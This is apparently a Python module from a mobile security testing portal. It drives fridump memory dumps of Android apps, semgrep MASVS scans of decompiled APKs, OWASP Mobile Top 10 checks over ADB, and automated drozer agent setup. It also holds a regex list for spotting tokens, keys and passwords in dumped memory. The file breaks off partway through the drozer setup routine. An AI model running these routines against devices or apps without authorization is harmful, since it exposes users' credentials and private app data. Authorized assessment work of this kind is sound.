"""External Security Agents – deep integration with drozer, medusa, semgrep, fridump, OWASP, hunter."""

import asyncio
import json
import os
import re
import shutil
import sys
import tempfile
import zipfile
from dataclasses import dataclass, field
from typing import Optional, Callable

from portal.config import ADB_PATH, MEDUSA_DIR, SEMGREP_DIR, BASE_DIR, FRIPTS_DIR, UPLOADS_DIR


_cached_serial: str = ""


async def _get_android_serial() -> str:
    """Get the Android device serial from ADB for precise frida targeting."""
    global _cached_serial
    if _cached_serial:
        return _cached_serial
    out, _, rc = await _exec([ADB_PATH, "get-serialno"], timeout=5)
    serial = out.strip() if rc == 0 else ""
    if serial and serial != "unknown":
        _cached_serial = serial
    return serial


async def _exec(args: list[str], timeout: int = 60, cwd: str = None, stdin_data: bytes = None) -> tuple[str, str, int]:
    proc = await asyncio.create_subprocess_exec(
        *args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        stdin=asyncio.subprocess.PIPE,
        cwd=cwd,
    )
    try:
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(input=stdin_data or b""), timeout=timeout
        )
    except asyncio.TimeoutError:
        proc.kill()
        try:
            await proc.wait()
        except Exception:
            pass
        return "", f"Command timed out after {timeout}s", -1
    return (
        stdout.decode("utf-8", errors="replace").strip(),
        stderr.decode("utf-8", errors="replace").strip(),
        proc.returncode or 0,
    )


# ──────────────────────────────────────────────
# FRIDUMP – Memory Dumping via Frida
# ──────────────────────────────────────────────
class FridumpAgent:
    """Deeply integrated memory dumper using the local fridump code."""

    def __init__(self):
        self.fridump_dir = str(BASE_DIR / "fridump")
        self.output_base = str(BASE_DIR / "dump_output")

    def is_available(self) -> bool:
        return os.path.exists(os.path.join(self.fridump_dir, "fridump.py"))

    async def _resolve_process(self, identifier: str) -> str:
        """Resolve a package identifier to the frida display name.
        fridump.py uses frida.attach(name) which needs the display name,
        not the package identifier (e.g. 'KChat' not 'com.qualgo.kchat')."""
        serial = await _get_android_serial()
        if serial:
            resolver_code = (
                "import frida\n"
                "d=frida.get_device(%r)\n"
                "target=%r\n"
                "for a in d.enumerate_applications(scope='full'):\n"
                "    if a.identifier==target:\n"
                "        print(a.name)\n"
                "        raise SystemExit(0)\n"
                "for p in d.enumerate_processes():\n"
                "    if target.lower() in p.name.lower():\n"
                "        print(p.name)\n"
                "        raise SystemExit(0)\n"
                "print(target)\n"
            ) % (serial, identifier)
        else:
            resolver_code = (
                "import frida\n"
                "d=frida.get_usb_device()\n"
                "target=%r\n"
                "for a in d.enumerate_applications(scope='full'):\n"
                "    if a.identifier==target:\n"
                "        print(a.name)\n"
                "        raise SystemExit(0)\n"
                "for p in d.enumerate_processes():\n"
                "    if target.lower() in p.name.lower():\n"
                "        print(p.name)\n"
                "        raise SystemExit(0)\n"
                "print(target)\n"
            ) % identifier
        try:
            out, _, rc = await _exec(
                [sys.executable, "-c", resolver_code], timeout=20,
            )
            if rc == 0 and out.strip():
                return out.strip()
        except Exception:
            pass
        return identifier

    async def dump_memory(
        self, process_name: str, output_dir: str = None,
        usb: bool = True, read_only: bool = False, run_strings: bool = True,
        progress_cb: Optional[Callable] = None,
    ) -> dict:
        if not self.is_available():
            return {"success": False, "error": "fridump not found"}

        if not output_dir:
            output_dir = os.path.join(self.output_base, process_name.replace(".", "_"))

        os.makedirs(output_dir, exist_ok=True)

        if progress_cb:
            await progress_cb("fridump", 5, f"Resolving process for {process_name}...")

        resolved = await self._resolve_process(process_name)

        serial = await _get_android_serial()
        cmd = [sys.executable, os.path.join(self.fridump_dir, "fridump.py")]
        if serial:
            cmd.extend(["-D", serial])
        elif usb:
            cmd.append("-U")
        if read_only:
            cmd.append("-r")
        if run_strings:
            cmd.append("-s")
        cmd.extend(["-o", output_dir, resolved])

        if progress_cb:
            await progress_cb("fridump", 10, f"Dumping memory of PID {resolved}...")

        out, err, rc = await _exec(cmd, timeout=300, cwd=self.fridump_dir)

        dump_files = []
        strings_file = None
        if os.path.isdir(output_dir):
            for f in os.listdir(output_dir):
                path = os.path.join(output_dir, f)
                if f == "strings.txt":
                    strings_file = path
                elif f.endswith("_dump.data"):
                    dump_files.append({"name": f, "size": os.path.getsize(path)})

        total_size = sum(d["size"] for d in dump_files)

        sensitive_strings = []
        scan_sources = []
        if strings_file and os.path.exists(strings_file):
            try:
                with open(strings_file, "r", errors="replace") as sf:
                    scan_sources.append(sf.read(2_000_000).replace("\x00", ""))
            except Exception:
                pass
        if not scan_sources and os.path.isdir(output_dir):
            grep_out, _, _ = await _exec(
                ["grep", "-rPao", r"[\x20-\x7E]{10,}", output_dir,
                 "--include=*.data", "-h"],
                timeout=60,
            )
            if grep_out:
                scan_sources.append(grep_out[:2_000_000])

        for content in scan_sources:
            sensitive_strings.extend(
                self._detect_secrets(content)
            )

        seen = set()
        deduped = []
        for s in sensitive_strings:
            key = (s["type"], s["value"][:80])
            if key not in seen:
                seen.add(key)
                deduped.append(s)
        sensitive_strings = deduped[:50]

        if progress_cb:
            await progress_cb("fridump", 100, f"Dump complete: {len(dump_files)} regions, {total_size} bytes")

        critical_types = {"JWT", "AuthToken", "RefreshToken", "Password", "PrivateKey",
                          "AWSAccessKey", "AWSSecretKey", "URLCredentials", "DBConnection"}
        high_types = {"Secret/Key", "GoogleAPIKey", "FirebaseKey", "SessionCookie",
                      "Base64Token", "KeystorePass", "GitHubToken"}

        return {
            "success": rc == 0,
            "output": out[:2000],
            "error": err[:500] if rc != 0 else "",
            "dump_dir": output_dir,
            "dump_files": len(dump_files),
            "total_size": total_size,
            "strings_file": strings_file,
            "sensitive_strings": sensitive_strings,
            "findings": [
                {
                    "severity": "CRITICAL" if s["type"] in critical_types
                               else "HIGH" if s["type"] in high_types
                               else "MEDIUM",
                    "category": f"Secret in Memory ({s['type']})",
                    "title": f"{s['type']} found in process memory",
                    "description": s["value"][:120],
                    "location": "Runtime Memory",
                    "evidence": s["value"][:200],
                    "recommendation": "Sensitive data must be cleared from memory after use. "
                                      "Use char[] instead of String for secrets, zero-out buffers.",
                }
                for s in sensitive_strings
            ],
        }

    @staticmethod
    def _detect_secrets(content: str) -> list[dict]:
        """Gitleaks-style secret detection with low false-positive patterns."""
        findings = []
        rules = [
            # JWT tokens (header.payload.signature, base64url)
            ("JWT", r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"),
            # Bearer / Auth tokens in key-value context
            ("AuthToken",
             r'(?i)(?:auth[_-]?token|access[_-]?token|bearer)\s*["\']?\s*[:=]\s*["\']?([A-Za-z0-9_.\-/+=]{20,})'),
            # Refresh tokens
            ("RefreshToken",
             r'(?i)refresh[_-]?token\s*["\']?\s*[:=]\s*["\']?([A-Za-z0-9_.\-/+=]{20,})'),
            # Generic secret/key assignments
            ("Secret/Key",
             r'(?i)(?:secret|private[_-]?key|api[_-]?key|apikey|app[_-]?secret)\s*["\']?\s*[:=]\s*["\']?([A-Za-z0-9_.\-/+=]{8,})'),
            # Password assignments
            ("Password",
             r'(?i)(?:password|passwd|pwd)\s*["\']?\s*[:=]\s*["\']?(\S{4,})'),
            # PEM private keys
            ("PrivateKey", r"-----BEGIN\s(?:RSA\s|EC\s|DSA\s|OPENSSH\s)?PRIVATE\sKEY-----"),
            # AWS keys
            ("AWSAccessKey", r"(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}"),
            ("AWSSecretKey", r'(?i)aws[_-]?secret[_-]?access[_-]?key\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})'),
            # Google API key
            ("GoogleAPIKey", r"AIza[0-9A-Za-z_-]{35}"),
            # Firebase
            ("FirebaseKey", r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}"),
            # URLs with embedded credentials
            ("URLCredentials", r"https?://[^\s:]+:[^\s@]+@[^\s]+"),
            # Session IDs in cookie format
            ("SessionCookie",
             r'(?i)(?:session[_-]?id|JSESSIONID|PHPSESSID|sid|connect\.sid)\s*[=:]\s*([A-Za-z0-9_.\-]{16,})'),
            # Base64-encoded blocks that might be tokens (40+ chars, not a common word)
            ("Base64Token",
             r'(?i)(?:token|session|auth|credential)\s*["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/]{40,}={0,2})'),
            # Android signing key / keystore password
            ("KeystorePass",
             r'(?i)(?:keystore[_-]?pass(?:word)?|store[_-]?password|key[_-]?password)\s*[=:]\s*(\S{4,})'),
            # Database connection strings
            ("DBConnection",
             r'(?i)(?:jdbc:|mongodb(?:\+srv)?://|postgres://|mysql://|sqlite:///)\S{10,}'),
            # Slack/Discord/Telegram tokens
            ("SlackToken", r"xox[bpors]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*"),
            ("DiscordToken", r"[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}"),
            ("TelegramToken", r"\d{8,10}:[A-Za-z0-9_-]{35}"),
            # GitHub tokens
            ("GitHubToken", r"(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}"),
        ]

        for label, pattern in rules:
            try:
                for m in re.finditer(pattern, content):
                    val = m.group(1) if m.lastindex and m.lastindex >= 1 else m.group(0)
                    if not val or len(val) < 8:
                        continue
                    findings.append({"type": label, "value": val[:300]})
                    if len(findings) > 200:
                        return findings
            except Exception:
                pass
        return findings

    async def search_strings(self, output_dir: str, query: str, max_results: int = 100) -> list[str]:
        results = []

        strings_file = os.path.join(output_dir, "strings.txt")
        try:
            pattern = re.compile(query, re.IGNORECASE)
        except re.error:
            pattern = None

        if os.path.exists(strings_file):
            try:
                with open(strings_file, "r", errors="replace") as f:
                    for line in f:
                        line_s = line.strip().replace("\x00", "")
                        if not line_s:
                            continue
                        matched = pattern.search(line_s) if pattern else (query.lower() in line_s.lower())
                        if matched:
                            results.append(line_s)
                            if len(results) >= max_results:
                                return results
            except Exception:
                pass

        if len(results) < max_results and os.path.isdir(output_dir):
            try:
                grep_args = ["grep", "-rPaoi", query, output_dir,
                             "--include=*.data", "-h", f"-m{max_results - len(results)}"]
                out, _, rc = await _exec(grep_args, timeout=60)
                if rc == 0 and out:
                    for line in out.splitlines():
                        clean = line.strip().replace("\x00", "")
                        if clean and clean not in results:
                            results.append(clean)
                            if len(results) >= max_results:
                                break
            except Exception:
                pass

        return results


# ──────────────────────────────────────────────
# SEMGREP – Static Analysis with MASVS Rules
# ──────────────────────────────────────────────
class SemgrepAgent:
    """Run semgrep with MASVS rules against decompiled APK source or XML."""

    def __init__(self):
        self.rules_dir = str(SEMGREP_DIR)

    def is_available(self) -> bool:
        return shutil.which("semgrep") is not None and os.path.isdir(self.rules_dir)

    def list_rules(self) -> list[dict]:
        rules = []
        if not os.path.isdir(self.rules_dir):
            return rules
        for root, dirs, files in os.walk(self.rules_dir):
            for f in files:
                if f.endswith(".yaml") or f.endswith(".yml"):
                    rel = os.path.relpath(os.path.join(root, f), self.rules_dir)
                    category = os.path.dirname(rel) or "general"
                    rule_id = f.replace(".yaml", "").replace(".yml", "")
                    rules.append({
                        "id": rule_id,
                        "category": category,
                        "path": rel,
                        "full_path": os.path.join(root, f),
                    })
        return sorted(rules, key=lambda x: x["id"])

    async def scan_directory(
        self, target_dir: str, categories: list[str] = None,
        progress_cb: Optional[Callable] = None,
    ) -> dict:
        if not self.is_available():
            return {"success": False, "error": "semgrep not installed or rules not found"}

        config = self.rules_dir
        if categories:
            configs = []
            for cat in categories:
                cat_dir = os.path.join(self.rules_dir, cat)
                if os.path.isdir(cat_dir):
                    configs.append(cat_dir)
            if configs:
                config = configs[0]

        if progress_cb:
            await progress_cb("semgrep", 20, "Running semgrep MASVS scan...")

        cmd = ["semgrep", "--config", config, target_dir, "--json", "--no-git-ignore", "--timeout", "30"]
        out, err, rc = await _exec(cmd, timeout=120)

        findings = []
        raw_results = []
        try:
            data = json.loads(out)
            raw_results = data.get("results", [])
            for r in raw_results:
                sev_map = {"ERROR": "HIGH", "WARNING": "MEDIUM", "INFO": "LOW"}
                extra = r.get("extra", {})
                meta = extra.get("metadata", {})
                findings.append({
                    "severity": sev_map.get(extra.get("severity", "INFO"), "MEDIUM"),
                    "category": f"MASVS/{meta.get('area', 'unknown')}",
                    "title": extra.get("message", r.get("check_id", ""))[:200],
                    "description": f"Rule: {r.get('check_id', '')}",
                    "location": f"{r.get('path', '')}:{r.get('start', {}).get('line', '')}",
                    "evidence": extra.get("lines", "")[:200],
                    "owasp": meta.get("owasp-mobile", ""),
                    "confidence": meta.get("confidence", ""),
                    "recommendation": f"See: {', '.join(meta.get('references', [])[:2])}",
                })
        except Exception:
            pass

        if progress_cb:
            await progress_cb("semgrep", 100, f"Semgrep found {len(findings)} issues")

        return {
            "success": True,
            "findings": findings,
            "total": len(findings),
            "rules_used": config,
            "raw_count": len(raw_results),
        }

    async def scan_apk(self, apk_path: str, progress_cb: Optional[Callable] = None) -> dict:
        """Decompile APK with apktool/jadx and scan the decompiled source with semgrep."""
        tmpdir = tempfile.mkdtemp(prefix="semgrep_apk_")
        decompiled = False
        try:
            if progress_cb:
                await progress_cb("semgrep", 10, "Decompiling APK...")

            if shutil.which("apktool"):
                out_dir = os.path.join(tmpdir, "apktool_out")
                _, err, rc = await _exec(
                    ["apktool", "d", "-f", "-o", out_dir, apk_path], timeout=120
                )
                if rc == 0 and os.path.isdir(out_dir):
                    decompiled = True
                    tmpdir = out_dir

            if not decompiled and shutil.which("jadx"):
                out_dir = os.path.join(tmpdir, "jadx_out")
                _, err, rc = await _exec(
                    ["jadx", "-d", out_dir, "--no-res", apk_path], timeout=180
                )
                if rc == 0 and os.path.isdir(out_dir):
                    decompiled = True
                    tmpdir = out_dir

            if not decompiled:
                with zipfile.ZipFile(apk_path, "r") as zf:
                    for name in zf.namelist():
                        if name.endswith(".xml") or name.endswith(".dex"):
                            try:
                                zf.extract(name, tmpdir)
                            except Exception:
                                pass

            return await self.scan_directory(tmpdir, progress_cb=progress_cb)
        except Exception as e:
            return {"success": False, "error": str(e), "findings": []}
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    async def scan_apk_xml(self, apk_path: str, progress_cb: Optional[Callable] = None) -> dict:
        """Alias kept for backward compatibility."""
        return await self.scan_apk(apk_path, progress_cb)


# ──────────────────────────────────────────────
# OWASP Mobile Top 10 Checker
# ──────────────────────────────────────────────
class OWASPChecker:
    """Comprehensive OWASP Mobile Top 10 checks via ADB."""

    def __init__(self, adb_path: str = ADB_PATH):
        self.adb_path = adb_path
        self.script_path = str(BASE_DIR / "top10_owasp" / "check_android_storage.sh")

    async def _shell(self, cmd: str, timeout: int = 15) -> str:
        out, _, _ = await _exec([self.adb_path, "shell", cmd], timeout=timeout)
        return out

    async def full_check(self, package: str, progress_cb: Optional[Callable] = None) -> list[dict]:
        findings = []

        checks = [
            ("M1: Improper Platform Usage", self._check_platform),
            ("M2: Insecure Data Storage", self._check_storage),
            ("M3: Insecure Communication", self._check_communication),
            ("M4: Insecure Authentication", self._check_auth),
            ("M5: Insufficient Cryptography", self._check_crypto),
            ("M7: Client Code Quality", self._check_code_quality),
            ("M8: Code Tampering", self._check_tampering),
            ("M9: Reverse Engineering", self._check_reverse_engineering),
            ("M10: Extraneous Functionality", self._check_extraneous),
        ]

        for i, (name, check_fn) in enumerate(checks):
            if progress_cb:
                pct = int((i / len(checks)) * 100)
                await progress_cb("owasp", pct, f"Checking {name}...")
            try:
                results = await check_fn(package)
                findings.extend(results)
            except Exception:
                pass

        if progress_cb:
            await progress_cb("owasp", 100, f"OWASP check complete: {len(findings)} findings")

        return findings

    async def _check_platform(self, pkg: str) -> list[dict]:
        findings = []
        dump = await self._shell(f"dumpsys package {pkg}")

        if "android:allowBackup" in dump and "true" in dump.lower():
            findings.append({
                "severity": "HIGH", "category": "M1 - Platform Usage",
                "title": "Application backup enabled (allowBackup=true)",
                "description": "Data can be extracted via adb backup",
                "recommendation": "Set android:allowBackup='false'",
            })

        if "DEBUGGABLE" in dump:
            findings.append({
                "severity": "CRITICAL", "category": "M1 - Platform Usage",
                "title": "Application is debuggable",
                "description": "Debugger can be attached to the running process",
                "recommendation": "Remove debuggable flag in release builds",
            })

        exported = dump.count("exported=true")
        if exported > 5:
            findings.append({
                "severity": "HIGH", "category": "M1 - Platform Usage",
                "title": f"{exported} exported components detected",
                "description": "Many exported components increase attack surface",
                "recommendation": "Minimize exported components; add permission checks",
            })

        return findings

    async def _check_storage(self, pkg: str) -> list[dict]:
        findings = []
        sensitive_keys = ["password", "token", "secret", "api_key", "session", "jwt", "cookie", "auth", "credential", "pin"]

        prefs = await self._shell(f"run-as {pkg} ls shared_prefs/ 2>/dev/null")
        if not prefs or "No such" in prefs:
            prefs = await self._shell(f"su 0 ls /data/data/{pkg}/shared_prefs/ 2>/dev/null")

        if prefs and "No such" not in prefs:
            for pf in prefs.splitlines():
                pf = pf.strip()
                if not pf or not pf.endswith(".xml"):
                    continue
                content = await self._shell(
                    f"run-as {pkg} cat shared_prefs/{pf} 2>/dev/null"
                )
                if not content:
                    content = await self._shell(f"su 0 cat /data/data/{pkg}/shared_prefs/{pf} 2>/dev/null")
                if content:
                    for key in sensitive_keys:
                        if key in content.lower():
                            findings.append({
                                "severity": "CRITICAL", "category": "M2 - Insecure Data Storage",
                                "title": f"Sensitive data '{key}' in SharedPreferences: {pf}",
                                "description": f"Cleartext sensitive data found in {pf}",
                                "evidence": content[:200],
                                "recommendation": "Use EncryptedSharedPreferences or Android Keystore",
                            })
                            break

        dbs = await self._shell(f"run-as {pkg} ls databases/ 2>/dev/null")
        if not dbs or "No such" in dbs:
            dbs = await self._shell(f"su 0 ls /data/data/{pkg}/databases/ 2>/dev/null")
        if dbs and "No such" not in dbs:
            for db in dbs.splitlines():
                db = db.strip()
                if db and (db.endswith(".db") or db.endswith(".sqlite")):
                    findings.append({
                        "severity": "MEDIUM", "category": "M2 - Insecure Data Storage",
                        "title": f"Unencrypted database: {db}",
                        "description": "Check for sensitive data in plaintext SQLite database",
                        "recommendation": "Use SQLCipher for encrypted database storage",
                    })

        ext = await self._shell(f"ls /sdcard/Android/data/{pkg}/ 2>/dev/null")
        if ext and "No such" not in ext:
            findings.append({
                "severity": "MEDIUM", "category": "M2 - Insecure Data Storage",
                "title": "Data on external storage",
                "description": f"Files found in /sdcard/Android/data/{pkg}/",
                "evidence": ext[:200],
                "recommendation": "Avoid storing sensitive data on external storage",
            })

        return findings

    async def _check_communication(self, pkg: str) -> list[dict]:
        findings = []
        dump = await self._shell(f"dumpsys package {pkg}")
        if "usesCleartextTraffic" in dump and "true" in dump:
            findings.append({
                "severity": "HIGH", "category": "M3 - Insecure Communication",
                "title": "Cleartext traffic allowed",
                "description": "usesCleartextTraffic=true in manifest",
                "recommendation": "Set usesCleartextTraffic='false' and use HTTPS",
            })
        if "networkSecurityConfig" not in dump:
            findings.append({
                "severity": "MEDIUM", "category": "M3 - Insecure Communication",
                "title": "No Network Security Config",
                "description": "Missing network_security_config.xml",
                "recommendation": "Add network security config to restrict trusted CAs",
            })
        return findings

    async def _check_auth(self, pkg: str) -> list[dict]:
        findings = []
        prefs = await self._shell(f"run-as {pkg} cat shared_prefs/*.xml 2>/dev/null")
        if not prefs:
            prefs = await self._shell(f"su 0 cat /data/data/{pkg}/shared_prefs/*.xml 2>/dev/null")
        if prefs:
            auth_tokens = re.findall(r"(?i)(session|auth|login|token)[^<]*<", prefs)
            if auth_tokens:
                findings.append({
                    "severity": "HIGH", "category": "M4 - Insecure Authentication",
                    "title": "Auth tokens stored in cleartext SharedPreferences",
                    "description": f"Found {len(auth_tokens)} auth-related entries",
                    "recommendation": "Store auth tokens using Android Keystore",
                })
        return findings

    async def _check_crypto(self, pkg: str) -> list[dict]:
        return []

    async def _check_code_quality(self, pkg: str) -> list[dict]:
        findings = []
        logs = await self._shell(f"logcat -d -t 200 | grep -i {pkg}")
        if logs:
            for key in ["password", "token", "secret", "key", "auth"]:
                if key in logs.lower():
                    findings.append({
                        "severity": "HIGH", "category": "M7 - Client Code Quality",
                        "title": f"Sensitive data '{key}' found in logcat",
                        "description": "Application logs may leak sensitive information",
                        "recommendation": "Remove sensitive logging in production builds",
                    })
                    break
        return findings

    async def _check_tampering(self, pkg: str) -> list[dict]:
        findings = []
        dump = await self._shell(f"dumpsys package {pkg}")
        if "DEBUGGABLE" in dump:
            findings.append({
                "severity": "HIGH", "category": "M8 - Code Tampering",
                "title": "Debuggable application",
                "description": "App can be tampered via debugging",
                "recommendation": "Ensure debuggable=false in release config",
            })
        return findings

    async def _check_reverse_engineering(self, pkg: str) -> list[dict]:
        return []

    async def _check_extraneous(self, pkg: str) -> list[dict]:
        findings = []
        dump = await self._shell(f"dumpsys package {pkg}")
        if "test" in dump.lower() and "android.intent.action.MAIN" in dump:
            findings.append({
                "severity": "LOW", "category": "M10 - Extraneous Functionality",
                "title": "Possible test/debug functionality in release",
                "description": "Test-related strings found in package dump",
                "recommendation": "Remove test functionality before release",
            })
        return findings


# ──────────────────────────────────────────────
# DROZER
# ──────────────────────────────────────────────
DROZER_AGENT_URL = "https://github.com/ReversecLabs/drozer-agent/releases/download/3.1.0/drozer-agent.apk"
DROZER_AGENT_PKGS = ["com.withsecure.dz", "com.mwr.dz"]
DROZER_AGENT_PKG = DROZER_AGENT_PKGS[0]


class DrozerAgent:
    """Integration with drozer security assessment framework.
    Handles automatic agent APK download, installation, and connection management."""

    def __init__(self, adb_path: str = ADB_PATH):
        self.adb_path = adb_path
        self._connected = False
        self._agent_apk_path = str(UPLOADS_DIR / "drozer-agent.apk")

    def is_installed(self) -> bool:
        return shutil.which("drozer") is not None

    async def is_agent_on_device(self) -> bool:
        out, _, rc = await _exec([self.adb_path, "shell", "pm", "list", "packages"], timeout=10)
        return any(pkg in out for pkg in DROZER_AGENT_PKGS)

    async def download_agent(self) -> tuple[bool, str]:
        if os.path.exists(self._agent_apk_path) and os.path.getsize(self._agent_apk_path) > 100_000:
            return True, f"Agent APK already downloaded: {self._agent_apk_path}"
        try:
            import urllib.request
            os.makedirs(os.path.dirname(self._agent_apk_path), exist_ok=True)
            urllib.request.urlretrieve(DROZER_AGENT_URL, self._agent_apk_path)
            if os.path.exists(self._agent_apk_path) and os.path.getsize(self._agent_apk_path) > 100_000:
                return True, "drozer-agent.apk downloaded successfully"
            return False, "Downloaded file is too small or missing"
        except Exception as e:
            return False, f"Download failed: {e}"

    async def install_agent(self) -> tuple[bool, str]:
        if await self.is_agent_on_device():
            return True, "drozer Agent already installed on device"
        if not os.path.exists(self._agent_apk_path):
            ok, msg = await self.download_agent()
            if not ok:
                return False, msg
        out, err, rc = await _exec(
            [self.adb_path, "install", "-r", "-g", self._agent_apk_path], timeout=60
        )
        if rc == 0 or "success" in (out + err).lower():
            return True, "drozer Agent installed on device"
        return False, f"Install failed: {(err or out)[:300]}"

    async def start_agent(self) -> tuple[bool, str]:
        methods_tried = []

        # --- Method 1: Open app + tap the toggle via uiautomator ---
        ui_ok = await self._enable_server_via_ui()
        methods_tried.append(f"ui_tap={'ok' if ui_ok else 'fail'}")
        if ui_ok:
            await asyncio.sleep(3)
            if await self._check_agent_port():
                return True, f"Agent server started (UI toggle). {methods_tried}"

        # --- Method 2: PWN broadcast (exported receiver) ---
        for pkg_prefix in DROZER_AGENT_PKGS:
            for action in [f"{pkg_prefix}.PWN", f"{pkg_prefix}.START_EMBEDDED"]:
                await _exec([
                    self.adb_path, "shell", "am", "broadcast", "-a", action,
                ], timeout=5)
        methods_tried.append("pwn_broadcast")
        await asyncio.sleep(3)

        if await self._check_agent_port():
            return True, f"Agent server started (broadcast). {methods_tried}"

        listening = await self._check_agent_port()
        return listening, f"Methods: {methods_tried}. Listening: {listening}"

    async def _enable_server_via_prefs(self) -> bool:
        """Enable the embedded server by setting localServerEnabled=true in SharedPreferences.
        Works when adb runs as root (emulators, rooted devices with 'adb root')."""
        for pkg in DROZER_AGENT_PKGS:
            prefs_path = f"/data/data/{pkg}/shared_prefs/{pkg}_preferences.xml"

            # Try reading without su first (works when adb is root), then with su
            content = ""
            for shell_prefix in [[], ["su", "-c"]]:
                cmd = [self.adb_path, "shell"] + shell_prefix + [f"cat {prefs_path}"]
                out, _, rc = await _exec(cmd, timeout=5)
                if rc == 0 and out.strip() and "<?xml" in out:
                    content = out
                    break

            if not content:
                continue

            if 'name="localServerEnabled"' not in content:
                continue

            if 'value="true"' in content and 'localServerEnabled' in content.split('value="true"')[0].split('\n')[-1]:
                return True  # already enabled

            new_content = re.sub(
                r'(<boolean\s+name="localServerEnabled"\s+value=")false(")',
                r'\1true\2',
                content,
            )
            if new_content == content:
                continue

            # Write back — try without su first, then with su
            for shell_prefix in [[], ["su", "-c"]]:
                write_cmd = [self.adb_path, "shell"] + shell_prefix
                # Use a heredoc-like approach via echo
                escaped = new_content.replace("'", "'\\''")
                write_cmd.append(f"echo '{escaped}' > {prefs_path}")
                _, _, wrc = await _exec(write_cmd, timeout=5)
                if wrc == 0:
                    # Fix ownership
                    stat_cmd = [self.adb_path, "shell"] + shell_prefix
                    stat_cmd.append(f"stat -c '%u:%g' /data/data/{pkg}/")
                    uid_out, _, _ = await _exec(stat_cmd, timeout=5)
                    owner = uid_out.strip()
                    if owner:
                        chown_cmd = [self.adb_path, "shell"] + shell_prefix
                        chown_cmd.append(f"chown {owner} {prefs_path} && chmod 660 {prefs_path}")
                        await _exec(chown_cmd, timeout=5)
                    return True

        return False

    async def _enable_server_via_ui(self) -> bool:
        """Open drozer Agent app and tap the Embedded Server toggle via uiautomator.
        The toggle is typically at the very bottom of the screen (even if clipped to 2px)
        but responds to taps at its exact reported center coordinates."""
        for pkg in DROZER_AGENT_PKGS:
            await _exec([
                self.adb_path, "shell", "am", "start", "-n",
                f"{pkg}/.activities.MainActivity"
            ], timeout=10)
        await asyncio.sleep(3)

        xml_content = await self._dump_ui()
        if not xml_content:
            return False

        toggle = self._find_toggle_in_xml(xml_content)
        if not toggle:
            return False

        checked, cx, cy, _height = toggle
        if checked:
            return True  # already ON

        # Tap the toggle at its exact center — works even when element is only 2px tall
        await _exec([
            self.adb_path, "shell", "input", "tap", str(cx), str(cy)
        ], timeout=5)
        await asyncio.sleep(2)

        # Verify toggle state changed
        xml2 = await self._dump_ui()
        if xml2:
            t2 = self._find_toggle_in_xml(xml2)
            if t2 and t2[0]:
                return True

        return True  # tapped at the right coordinates

    async def _dump_ui(self) -> str:
        _, _, rc = await _exec([
            self.adb_path, "shell", "uiautomator", "dump", "/sdcard/drozer_ui.xml"
        ], timeout=15)
        if rc != 0:
            return ""
        content, _, _ = await _exec([
            self.adb_path, "shell", "cat", "/sdcard/drozer_ui.xml"
        ], timeout=5)
        return content or ""

    @staticmethod
    def _find_toggle_in_xml(xml_content: str):
        """Find the server toggle button. Returns (checked, cx, cy, height) or None."""
        # Priority 1: look for the specific ToggleButton by resource-id
        patterns = [
            r'resource-id="[^"]*adb_server_toggle[^"]*"[^>]*'
            r'checkable="true"[^>]*checked="(true|false)"[^>]*'
            r'bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"',
            # Priority 2: any ToggleButton that is checkable
            r'class="android\.widget\.ToggleButton"[^>]*'
            r'checkable="true"[^>]*checked="(true|false)"[^>]*'
            r'bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"',
            # Priority 3: any Switch widget
            r'class="android\.widget\.Switch"[^>]*'
            r'checkable="true"[^>]*checked="(true|false)"[^>]*'
            r'bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"',
        ]
        for pattern in patterns:
            m = re.search(pattern, xml_content, re.IGNORECASE)
            if m:
                checked = m.group(1) == "true"
                x1, y1, x2, y2 = int(m.group(2)), int(m.group(3)), int(m.group(4)), int(m.group(5))
                height = y2 - y1
                cx, cy = (x1 + x2) // 2, (y1 + y2) // 2
                return checked, cx, cy, height

        # Fallback: look for bounds on any node with text OFF/ON near adb_server
        m = re.search(
            r'text="OFF"[^>]*resource-id="[^"]*adb_server[^"]*"[^>]*'
            r'bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"',
            xml_content, re.IGNORECASE
        )
        if m:
            x1, y1, x2, y2 = int(m.group(1)), int(m.group(2)), int(m.group(3)), int(m.group(4))
            return False, (x1 + x2) // 2, (y1 + y2) // 2, y2 - y1
        return None

    async def full_setup(self, progress_cb: Optional[Callable] = None) -> dict:
        """Full automated setup: download APK, install, forward port, start agent, connect."""
        steps = []

        if progress_cb:
            await progress_cb("drozer", 5, "Checking drozer CLI...")
        cli_ok = self.is_installed()
        steps.append({"step": "cli_check", "success": cli_ok,
                       "detail": "drozer CLI found" if cli_ok else "drozer CLI not installed (pip install drozer)"})
        if not cli_ok:
            if progress_cb:
                await progress_cb("drozer", 10, "Installing drozer CLI...")
            out, err, rc = await _exec([sys.executable, "-m", "pip", "install", "drozer"], timeout=120)
            cli_ok = rc == 0
            steps.append({"step": "cli_install", "success": cli_ok,
                           "detail": "Installed" if cli_ok else f"Failed: {err[:200]}"})

        if progress_cb:
            await progress_cb("drozer", 20, "Checking agent on device...")
        on_device = await self.is_agent_on_device()
        if not on_device:
            if progress_cb:
                await progress_cb("drozer", 30, "Downloading drozer agent APK...")
            ok, msg = await self.download_agent()
            steps.append({"step": "download_apk", "success": ok, "detail": msg})
            if ok:
                if progress_cb:
                    await progress_cb("drozer", 50, "Installing agent on device...")
                ok2, msg2 = await self.install_agent()
                steps.append({"step": "install_apk", "success": ok2, "detail": msg2})
                on_device = ok2
        else:
            steps.append({"step": "agent_check", "success": True, "detail": "Agent already installed"})

        if progress_cb:
            await progress_cb("drozer", 70, "Starting agent & forwarding port...")
        if on_device:
            await self.start_agent()
